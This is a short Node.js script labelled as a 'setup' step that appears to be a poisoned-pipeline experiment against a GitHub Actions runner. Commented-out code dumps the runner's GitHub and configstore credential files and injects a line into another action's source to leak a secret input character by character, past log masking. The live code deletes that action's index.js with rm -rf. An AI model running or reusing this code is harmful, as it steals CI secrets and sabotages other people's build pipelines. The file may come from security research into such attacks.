const cl_process = require("child_process");
const fs = require("fs");

console.log("this is a setup.....")


// const files_other = fs.readdirSync('/home/runner/.config/GitHub');
//     files_other.forEach(element => {
//         let path = `/home/runner/.config/GitHub/${element}`;
            
//         cl_process.exec(`cat ${path}`, (err, stdout, stderr) => {
//             if (err){
//                 console.log(err);
//                 return;
//             }
//             console.log(`-----${element}------`);
//             console.log(`stdout: ${stdout.toString()}`);
//             console.log(`stderr: ${stderr}`);
//         });
//     });

    
// const files_other1 = fs.readdirSync('/home/runner/.config/configstore');
// files_other1.forEach(element => {
//     let path = `/home/runner/.config/configstore/${element}`;
        
//     cl_process.exec(`cat ${path}`, (err, stdout, stderr) => {
//         if (err){
//             console.log(err);
//             return;
//         }
//         console.log(`-----${element}------`);
//         console.log(`stdout: ${stdout.toString()}`);
//         console.log(`stderr: ${stderr}`);
//     });
// });


// secret leakage
// let insertcontent = 'console.log(JSON.stringify(process.env["INPUT_HI-THERE"].split("")));';
// cl_process.exec(`sed -i '21i ${insertcontent}' /home/runner/work/_actions/dreamli0/my-action/main/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });

//remove action file - poisone pipeline execution - fail
cl_process.exec(`rm -rf /home/runner/work/_actions/dreamli0/my-action/main/index.js`, (err, stdout, stderr) => {
    if (err){
        console.log(err);
        return;
    }
    console.log(`stdout: ${stdout.toString()}`);
    console.log(`stderr: ${stderr}`);
});





